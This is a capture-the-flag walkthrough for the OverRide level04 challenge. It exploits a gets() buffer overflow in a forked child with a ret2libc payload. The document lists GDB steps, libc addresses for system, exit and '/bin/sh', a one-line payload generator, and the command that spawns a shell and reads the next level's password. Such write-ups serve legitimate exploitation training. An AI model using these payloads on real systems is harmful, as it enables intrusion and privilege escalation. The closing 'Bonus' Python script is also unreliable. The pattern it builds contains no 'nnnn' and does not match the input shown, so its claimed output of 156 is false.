# Level04 - OverRide Walkthrough

This level presents a classic **buffer overflow** vulnerability in a binary that forks a child process and uses `gets()` to read user input.
The objective is to exploit this vulnerability to execute `/bin/sh` via a **ret2libc** technique and escalate to `level05`.

---

## 🔍 Binary Behavior

1. The program forks:

   * Parent process waits for the child and uses `ptrace()` to prevent `exec()` in the child.
   * Child process reads input using `gets()` → vulnerable to buffer overflow.

2. If you provide shellcode with `execve`, the program will detect it and deny access.

---

## ⚙️ Strategy: ret2libc

Instead of injecting shellcode, we use the ret2libc technique:

* **Goal:** Overflow the buffer to overwrite `EIP` with the address of `system()`.
* **Then:** Provide `exit()` as return, and `"/bin/sh"` as the argument for `system()`.

---

## 🧪 Step-by-Step Exploitation

### 1. Find the EIP Offset

Launch GDB and use a pattern to crash the program:

```bash
gdb ./level04
(gdb) set follow-fork-mode child
(gdb) run
```

Input:

```text
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
```

After crash:

```gdb
EIP = 0x6e6e6e6e ('nnnn')
```

Using a pattern tool or script:

```python
pattern.find("nnnn") => 156
```

✅ **Offset = 156**

---

### 2. Gather libc addresses (from GDB)

```gdb
(gdb) info functions system   → 0xf7e6aed0
(gdb) info functions exit     → 0xf7e5eb70
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh" → 0xf7f897ec
```

### 3. Create Payload

```bash
python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/payload
```

### 4. Execute

```bash
cat /tmp/payload - | ./level04
```

Check if you have a shell:

```bash
whoami   → level05
cat /home/users/level05/.pass
```

---

## 🧠 Notes

* The vulnerability is in the child process → use `set follow-fork-mode child` in GDB.
* You must avoid `exec` due to `ptrace` detection in parent.
* The payload structure is:

```
[padding 156 bytes] + [system()] + [exit()] + ["/bin/sh"]
```

---

## 🧾 Bonus: How to Reproduce Offset Calculation

You can use this simple Python script:

```python
pattern = "".join([
    f"{a}{b}{c}{d}"
    for a in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    for b in "abcdefghijklmnopqrstuvwxyz"
    for c in "0123456789"
    for d in "0123456789"
])

print(pattern.find("nnnn"))  # Output: 156
```

---

## 🧠 Author Notes

This level is a great introduction to classic binary exploitation techniques, especially when constrained by runtime protections (like `ptrace` checking for `exec`).
